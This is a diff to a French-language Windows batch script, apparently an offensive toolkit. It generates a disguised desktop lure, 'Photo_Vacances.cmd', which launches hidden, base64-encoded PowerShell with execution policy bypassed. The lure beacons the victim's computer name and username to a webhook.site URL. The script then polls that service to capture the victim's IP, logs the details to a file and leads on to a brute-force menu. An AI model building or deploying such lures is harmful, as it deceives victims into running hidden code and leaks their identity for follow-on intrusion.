@@ -1451,9 +1451,9 @@ if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
 >> "%PS_GRAB_FILE%" echo $url = 'https://webhook.site/' + $id
 >> "%PS_GRAB_FILE%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
 >> "%PS_GRAB_FILE%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
->> "%PS_GRAB_FILE%" echo $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + ``$env:COMPUTERNAME + '/' + ``$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
->> "%PS_GRAB_FILE%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
->> "%PS_GRAB_FILE%" echo $cmd = "@echo off``r``nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64``r``nexit"
+>> "%PS_GRAB_FILE%" echo     $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
+>> "%PS_GRAB_FILE%" echo     $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
+>> "%PS_GRAB_FILE%" echo     $cmd = "@echo off`r`nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`r`nexit"
 >> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
 >> "%PS_GRAB_FILE%" echo Write-Host ''
 >> "%PS_GRAB_FILE%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
@@ -1479,7 +1479,7 @@ if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
 >> "%PS_GRAB_FILE%" echo       Write-Host ('   Machine : ' + $pc_val)  -f White
 >> "%PS_GRAB_FILE%" echo       Write-Host ('   Session : ' + $usr_val) -f White
 >> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
->> "%PS_GRAB_FILE%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value $ip_val -Encoding ASCII
+>> "%PS_GRAB_FILE%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val|$pc_val|$usr_val" -Encoding ASCII
 >> "%PS_GRAB_FILE%" echo     }
 >> "%PS_GRAB_FILE%" echo   } catch {}
 >> "%PS_GRAB_FILE%" echo   if (-not $found) {
@@ -1506,10 +1506,19 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB_FILE%"
 if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
 
 if exist "%TEMP%\captured_ip.txt" (
-    set /p remote_ip=<"%TEMP%\captured_ip.txt"
+    set /p capture_data=<"%TEMP%\captured_ip.txt"
+    for /f "tokens=1-3 delims=|" %%a in ("!capture_data!") do (
+        set "remote_ip=%%a"
+        set "remote_pc=%%b"
+        set "remote_user=%%c"
+    )
     del /f /q "%TEMP%\captured_ip.txt"
+
+    echo [%date% %time%] IP: !remote_ip! ^| PC: !remote_pc! ^| User: !remote_user! >> "ip distant.txt"
+
     echo.
-    echo  [!] CIBLE DETECTEE : !remote_ip!
+    echo  [!] CIBLE DETECTEE : !remote_ip! (!remote_pc!\!remote_user!)
+    echo  [i] Informations enregistrees dans 'ip distant.txt'
     echo.
     set "opts=Passer a l'Audit de penetration ^& Brute-Force;Retour au menu"
     call :DynamicMenu "SUITE LOGIQUE" "!opts!" "NONUMS NOCLS"
